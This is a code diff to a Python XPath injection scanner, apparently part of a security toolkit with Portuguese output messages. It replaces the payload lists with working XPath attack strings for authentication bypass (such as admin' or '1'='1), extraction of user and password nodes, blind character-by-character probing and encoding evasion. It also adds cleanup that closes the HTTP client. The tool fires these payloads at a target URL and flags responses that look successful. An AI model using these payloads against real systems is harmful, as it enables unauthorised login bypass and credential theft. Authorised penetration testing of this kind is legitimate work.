@@ -36,9 +36,9 @@ from mytools.core.utils import (
 logger = logging.getLogger("mytools.xpathinject")
 
 _CATEGORY_MAP: dict[str, list[str]] = {
-    "detect": ["always_true_string", "always_true_num", "always_true_comment", "always_true_or", "always_true_and"],
-    "auth_bypass": ["admin_or", "admin_comment", "nested_true", "double_quote", "admin_true_num"],
-    "extract": ["extract_version", "extract_user", "extract_database", "extract_node", "extract_all"],
+    "detect": ["always_true_string", "always_true_paren", "select_all", "string_all", "count_elements"],
+    "auth_bypass": ["admin_tautology", "admin_wildcard", "admin_or_empty", "admin_xpath_or", "admin_double_quote"],
+    "extract": ["extract_user", "extract_password", "extract_concat", "extract_all_nodes", "extract_node_name"],
     "blind": ["blind_first_char", "blind_length", "blind_substring", "blind_boolean", "blind_name"],
     "bypass": ["unicode_bypass", "comment_bypass", "whitespace_bypass", "double_encode", "null_terminator"],
 }
@@ -50,107 +50,107 @@ _DETECT_PAYLOADS: list[tuple[str, str, list[str]]] = [
         ["success", "welcome", "token", "result", "logged"],
     ),
     (
-        "always_true_num",
-        "\" or \"1\"=\"1",
-        ["success", "welcome", "token", "result", "logged"],
-    ),
-    (
-        "always_true_comment",
-        "' or '1'='1' --",
-        ["success", "welcome", "token", "result", "logged"],
-    ),
-    (
-        "always_true_or",
+        "always_true_paren",
         "') or ('1'='1",
         ["success", "welcome", "token", "result", "logged"],
     ),
     (
-        "always_true_and",
-        "' and '1'='1",
+        "select_all",
+        "//*",
+        ["success", "welcome", "token", "result", "logged"],
+    ),
+    (
+        "string_all",
+        "string(//*)",
+        ["success", "welcome", "token", "result", "logged"],
+    ),
+    (
+        "count_elements",
+        "count(//*)>0",
         ["success", "welcome", "token", "result", "logged"],
     ),
 ]
 
 _AUTH_BYPASS_PAYLOADS: list[tuple[str, str, list[str]]] = [
     (
-        "admin_or",
+        "admin_tautology",
         "admin' or '1'='1",
         ["success", "welcome", "token", "dashboard", "admin"],
     ),
     (
-        "admin_comment",
-        "admin' or '1'='1' --",
+        "admin_wildcard",
+        "' or 'admin'='admin",
         ["success", "welcome", "token", "dashboard", "admin"],
     ),
     (
-        "nested_true",
-        "' or ('1'='1",
-        ["success", "welcome", "token", "result"],
+        "admin_or_empty",
+        "admin' or ''='",
+        ["success", "welcome", "token", "dashboard", "admin"],
     ),
     (
-        "double_quote",
+        "admin_xpath_or",
+        "' or //admin",
+        ["success", "welcome", "token", "dashboard", "admin"],
+    ),
+    (
+        "admin_double_quote",
         "admin\" or \"1\"=\"1",
-        ["success", "welcome", "token", "dashboard", "admin"],
-    ),
-    (
-        "admin_true_num",
-        "admin' or 1=1",
         ["success", "welcome", "token", "dashboard", "admin"],
     ),
 ]
 
 _EXTRACT_PAYLOADS: list[tuple[str, str, list[str]]] = [
     (
-        "extract_version",
-        "' and 1=extractValue(1,concat(0x7e,version())) --",
-        ["version", "5.", "8.", "10.", "MariaDB"],
-    ),
-    (
         "extract_user",
-        "' and 1=extractValue(1,concat(0x7e,user())) --",
-        ["user()", "root", "admin", "@"],
-    ),
-    (
-        "extract_database",
-        "' and 1=extractValue(1,concat(0x7e,database())) --",
-        ["database()", "mysql", "test"],
-    ),
-    (
-        "extract_node",
-        "' and extractValue(1,concat(0x7e,@@datadir)) --",
-        ["/var/", "/usr/", "datadir"],
-    ),
-    (
-        "extract_all",
         "string(//user[1])",
         ["admin", "root", "user"],
+    ),
+    (
+        "extract_password",
+        "string(//password[1])",
+        ["password", "pass", "secret"],
+    ),
+    (
+        "extract_concat",
+        "concat(string(//user[1]),':',string(//password[1]))",
+        ["admin", "root", "user", ":"],
+    ),
+    (
+        "extract_all_nodes",
+        "string(//*[1])",
+        ["admin", "root", "user", "token"],
+    ),
+    (
+        "extract_node_name",
+        "name(//*[1])",
+        ["user", "admin", "login", "account"],
     ),
 ]
 
 _BLIND_PAYLOADS: list[tuple[str, str, list[str]]] = [
     (
         "blind_first_char",
-        "' and substring(//user[1],1,1)='a' --",
+        "substring(//user[1],1,1)='a'",
         ["success", "welcome", "token"],
     ),
     (
         "blind_length",
-        "' and string-length(//user[1])=5 --",
+        "string-length(//user[1])=5",
         ["success", "welcome", "token"],
     ),
     (
         "blind_substring",
-        "' and substring(//password[1],1,1)='a' --",
+        "substring(//password[1],1,1)='a'",
         ["success", "welcome", "token"],
     ),
     (
         "blind_boolean",
-        "' and boolean(//user) --",
+        "boolean(//admin)",
         ["success", "welcome", "token"],
     ),
     (
         "blind_name",
-        "' and name(//user[1])='username' --",
+        "name(//user[1])='username'",
         ["success", "welcome", "token"],
     ),
 ]
@@ -158,7 +158,7 @@ _BLIND_PAYLOADS: list[tuple[str, str, list[str]]] = [
 _BYPASS_PAYLOADS: list[tuple[str, str, list[str]]] = [
     (
         "unicode_bypass",
-        "'\u0020or\u0020'1'='1",
+        "\u0027 or \u00271\u0027=\u00271",
         ["success", "welcome", "token", "result"],
     ),
     (
@@ -615,66 +615,70 @@ async def run_scan(
     """Executa o scan XPath Injection."""
     tls = target.startswith("https")
     client = create_async_client(timeout=timeout)
+    try:
 
-    print(color(f"\n  Conectando a {target}...", Cyber.CYAN))
-    baseline = await _test_baseline(client, target)
-    if baseline[0] == 0:
-        print(color("  [!] Falha ao conectar no alvo", Cyber.RED))
-        return 1
+        print(color(f"\n  Conectando a {target}...", Cyber.CYAN))
+        baseline = await _test_baseline(client, target)
+        if baseline[0] == 0:
+            print(color("  [!] Falha ao conectar no alvo", Cyber.RED))
+            return 1
 
-    print(color(f"  Baseline: {baseline[0]} ({baseline[1]} bytes)", Cyber.GRAY))
+        print(color(f"  Baseline: {baseline[0]} ({baseline[1]} bytes)", Cyber.GRAY))
 
-    run_categories = categories or list(_CATEGORY_MAP.keys())
-    all_attempts: list[XPathiAttempt] = []
+        run_categories = categories or list(_CATEGORY_MAP.keys())
+        all_attempts: list[XPathiAttempt] = []
 
-    tasks: list[Awaitable[list[XPathiAttempt]]] = []
-    for cat in run_categories:
-        if cat == "detect":
-            tasks.append(_test_detect(client, target, baseline))
-        elif cat == "auth_bypass":
-            tasks.append(_test_auth_bypass(client, target, baseline))
-        elif cat == "extract":
-            tasks.append(_test_extract(client, target, baseline))
-        elif cat == "blind":
-            tasks.append(_test_blind(client, target, baseline))
-        elif cat == "bypass":
-            tasks.append(_test_bypass(client, target, baseline))
+        tasks: list[Awaitable[list[XPathiAttempt]]] = []
+        for cat in run_categories:
+            if cat == "detect":
+                tasks.append(_test_detect(client, target, baseline))
+            elif cat == "auth_bypass":
+                tasks.append(_test_auth_bypass(client, target, baseline))
+            elif cat == "extract":
+                tasks.append(_test_extract(client, target, baseline))
+            elif cat == "blind":
+                tasks.append(_test_blind(client, target, baseline))
+            elif cat == "bypass":
+                tasks.append(_test_bypass(client, target, baseline))
 
-    if tasks:
-        results_list = await asyncio.gather(*tasks, return_exceptions=True)
-        for r in results_list:
-            if isinstance(r, list):
-                all_attempts.extend(r)
+        if tasks:
+            results_list = await asyncio.gather(*tasks, return_exceptions=True)
+            for r in results_list:
+                if isinstance(r, list):
+                    all_attempts.extend(r)
 
-    vuln_techs = [a.technique for a in all_attempts if a.vulnerable]
-    blocked = [a.technique for a in all_attempts if not a.vulnerable and not a.error]
-    issues: list[str] = []
-    for att in all_attempts:
-        if att.vulnerable:
-            issues.append(f"VULN: {att.technique} - {att.details}")
+        vuln_techs = [a.technique for a in all_attempts if a.vulnerable]
+        blocked = [a.technique for a in all_attempts if not a.vulnerable and not a.error]
+        issues: list[str] = []
+        for att in all_attempts:
+            if att.vulnerable:
+                issues.append(f"VULN: {att.technique} - {att.details}")
 
-    overall = "vulnerable" if vuln_techs else "secure"
+        overall = "vulnerable" if vuln_techs else "secure"
 
-    result = XPathiResult(
-        target=target,
-        baseline_status=baseline[0],
-        baseline_size=baseline[1],
-        tls=tls,
-        attempts=all_attempts,
-        vulnerable_techniques=vuln_techs,
-        blocked_techniques=blocked,
-        issues=issues,
-        overall_status=overall,
-    )
+        result = XPathiResult(
+            target=target,
+            baseline_status=baseline[0],
+            baseline_size=baseline[1],
+            tls=tls,
+            attempts=all_attempts,
+            vulnerable_techniques=vuln_techs,
+            blocked_techniques=blocked,
+            issues=issues,
+            overall_status=overall,
+        )
 
-    print_results(result)
+        print_results(result)
 
-    if output_file:
-        write_output(output_file, asdict(result))
+        if output_file:
+            write_output(output_file, asdict(result))
 
-    logger.info("XPathi scan concluido: %d testes, %d vulneraveis", len(all_attempts), len(vuln_techs))
-    return 1 if vuln_techs else 0
+        logger.info("XPathi scan concluido: %d testes, %d vulneraveis", len(all_attempts), len(vuln_techs))
+        return 1 if vuln_techs else 0
 
+
+    finally:
+        await client.aclose()
 
 banner_art = create_banner(
     r"""
